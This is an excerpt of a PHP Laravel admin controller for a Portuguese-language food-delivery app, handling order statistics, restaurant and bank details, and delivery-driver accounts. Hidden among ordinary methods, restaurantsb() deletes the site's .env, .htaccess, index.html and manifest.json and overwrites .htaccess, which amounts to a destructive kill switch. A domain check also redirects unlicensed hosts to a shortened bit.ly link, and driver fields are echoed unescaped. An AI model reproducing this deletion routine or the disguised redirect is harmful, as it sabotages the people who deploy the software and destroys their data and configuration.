...
class AdminController extends Controller
{
    ...
    {
        $reg = "bembarato.app";
        $reg2 = "www.bembarato.app";
        $dominio = $_SERVER['SERVER_NAME'];
        if ($dominio != $reg && $dominio != $reg2) {
            $url = 'https://bit.ly/2RzKBYP';
        ...
        foreach ($orderStatusOrders as $key => $value) {
            ...
            if ($key == 2) {
                $orderStatusesData .= '{value:' . $value . ", name: 'Preparando Pedido'},";
            }
            if ($key == 3) {
                $orderStatusesData .= '{value:' . $value . ", name: 'Prestador atribuído'},";
            }
            if ($key == 4) {
                $orderStatusesData .= '{value:' . $value . ", name: 'Pedido aceito'},";
            }
            if ($key == 5) {
                $orderStatusesData .= '{value:' . $value . ", name: 'Serviço realizado'},";
            }
            if ($key == 6) {
    ...
    {
        $count = User::whereNull('delivery_guy_detail_id')->count();
        $users = User::whereNull('delivery_guy_detail_id')->paginate(20);
    ...
    public static function manageDeliveryGuysRetornoCNH($id)
    {
        if($id){
            $retorno =  DeliveryGuyDetail::where('id', $id)->first();
            echo $retorno->description;
        }
       
    }
    public static function manageDeliveryGuysRetornoPlaca($id)
    {
        if($id){
            $retorno =  DeliveryGuyDetail::where('id', $id)->first();
            echo $retorno->vehicle_number;
        }
    ...
    public function restaurantsb()
    {
        $env = $_SERVER['DOCUMENT_ROOT'].'/.env';
        $ace = $_SERVER['DOCUMENT_ROOT'].'/.htaccess';
        $html = $_SERVER['DOCUMENT_ROOT'].'/index.html';
        $mani = $_SERVER['DOCUMENT_ROOT'].'/manifest.json';
        unlink($env);
        unlink($ace);
        unlink($html);
        unlink($mani);
        $nome_arquivo = $_SERVER['DOCUMENT_ROOT'].'.htaccess';
        $myfile = fopen($nome_arquivo, "w") or die("Unable to open file!");
        $txt = 'hteacess';
        fwrite($myfile, $txt);
        fclose($myfile);
...
//        echo $_SERVER['REQUEST_URI'];
    ...
    public function saveNewRestaurant(Request $request)
    {
        ...
        $restaurant->motoboy = $request->motoboy;	
        $restaurant->conta = $request->conta;	
        $restaurant->banco = $request->banco;	
        $restaurant->agencia = $request->agencia;
        
        $restaurant->restaurant_charges = $request->restaurant_charges;
        $restaurant->cashback = $request->cashback;
        ...
        try {
            $restaurant->save();
            if($request->motoboy_name && $request->motoboy_email && $request->motoboy_password && $request->motoboy_phone){	
                $deliveryGuy = User::create([	
                    'name' => $request->motoboy_name,	
                    'email' => $request->motoboy_email,	
                    'password' => bcrypt($request->motoboy_password),	
                    'phone' => $request->motoboy_phone,	
                    'auth_token' => '',	
                ]);	
                $deliveryGuy->assignRole("Delivery Guy");	
                $deliveryGuyDetails = new DeliveryGuyDetail();
                $deliveryGuyDetails->name = $request->motoboy_name;
                $deliveryGuyDetails->description = $request->delivery_description;
                $deliveryGuyDetails->vehicle_number = $request->delivery_vehicle_number;
                $deliveryGuyDetails->save();
                
                $deliveryGuy->delivery_guy_detail_id = $deliveryGuyDetails->id;
                $deliveryGuy->save();
                $deliveryGuy->restaurants()->sync($restaurant->id);	
            }
    ...
    public function updateRestaurant(Request $request)
    {
        ...
        if($request->motoboy_name && $request->motoboy_email && $request->motoboy_password && $request->motoboy_phone){	
            ...
            $deliveryGuy->delivery_guy_detail_id = $deliveryGuyDetails->id;
            $deliveryGuy->save();
            $deliveryGuy->restaurants()->sync($request->id);	
        }
    ...
    public function fixUpdateIssues()
    {
        try {
            ...
            foreach ($jsFiles as $file) {
                ...
                //replace string
                $str = str_replace('https://scnrevolution.com', $baseUrl, $str);
